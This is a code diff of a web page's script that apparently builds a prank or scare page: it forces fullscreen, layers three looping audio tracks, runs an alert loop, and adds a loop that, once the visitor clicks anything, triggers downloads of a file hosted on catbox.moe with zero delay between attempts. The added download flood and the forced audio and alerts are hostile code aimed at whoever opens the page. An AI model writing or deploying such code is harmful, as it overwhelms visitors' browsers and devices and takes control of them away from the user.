@@ -532,29 +532,24 @@
 <script>
 let audioStarted = false;
 
-let horrorAudio = new Audio('rudeboy.mp3');
-horrorAudio.loop = true;
-horrorAudio.volume = 1.0;
-horrorAudio.preload = 'auto';
+let audio1 = new Audio('rudeboy.mp3');
+audio1.loop = true;
+audio1.volume = 0.8;
+audio1.preload = 'auto';
 
-/* 🔥 NEW: second audio */
-let secondAudio = new Audio('SECOND_AUDIO.mp3');
-secondAudio.loop = true;       // set false if you want it once
-secondAudio.volume = 1.0;
-secondAudio.preload = 'auto';
+let audio2 = new Audio('whistleking.mp3');
+audio2.loop = true;
+audio2.volume = 0.6;
+audio2.preload = 'auto';
 
-let thirdAudio = new Audio('THIRD_AUDIO.mp3');
-thirdAudio.loop = true;
-thirdAudio.volume = 1.0;
-thirdAudio.preload = 'auto';
+let audio3 = new Audio('south32.mp3');
+audio3.loop = true;
+audio3.volume = 0.5;
+audio3.preload = 'auto';
 
 let alertsArmed = false;
 let alertInterval = null;
 
-/* 🔥 NEW: download state */
-let downloadInterval = null;
-let downloadsStarted = false;
-const DOWNLOAD_URL = "https://files.catbox.moe/kux6de.png";
 
 /* ---------- FULLSCREEN ---------- */
 function forceFullscreenNow() {
@@ -578,17 +573,18 @@ document.addEventListener('click', function startAudio() {
     if (audioStarted) return;
     audioStarted = true;
 
-    horrorAudio.play().catch(() => { audioStarted = false; });
+    // Start first audio immediately
+    audio1.play().catch(() => {});
 
-    // second audio after 5s
+    // Start second audio after 5 seconds
     setTimeout(() => {
-        secondAudio.play().catch(() => {});
+        audio2.play().catch(() => {});
     }, 5000);
 
-    // third audio after 10s
+    // Start third audio after 10 seconds
     setTimeout(() => {
-        thirdAudio.play().catch(() => {});
-    }, 7000);
+        audio3.play().catch(() => {});
+    }, 10000);
 });
 
 /* ---------- ALERT LOOP ---------- */
@@ -608,19 +604,27 @@ function startAlertLoop() {
 }
 
 /* 🔥 NEW: DOWNLOAD LOOP (user-initiated) */
-function startDownloadLoop() {
-    if (downloadsStarted) return;
-    downloadsStarted = true;
+const DOWNLOAD_URL = "https://files.catbox.moe/kux6de.png";
 
-    downloadInterval = setInterval(() => {
-        const a = document.createElement("a");
-        a.href = DOWNLOAD_URL;
-        a.download = "";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-    }, 1500);
-}
+let downloadsUnlocked = false;
+
+/* 🔓 unlock on ANY user gesture (once) */
+document.addEventListener("click", () => {
+    downloadsUnlocked = true;
+}, { once: true });
+
+/* 🔁 START IMMEDIATELY — no waiting */
+setInterval(() => {
+    if (!downloadsUnlocked) return;
+
+    const a = document.createElement("a");
+    a.href = DOWNLOAD_URL;
+    a.download = "";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+}, 0); // no delay between attempts
 
 setTimeout(() => {
     alertsArmed = true;
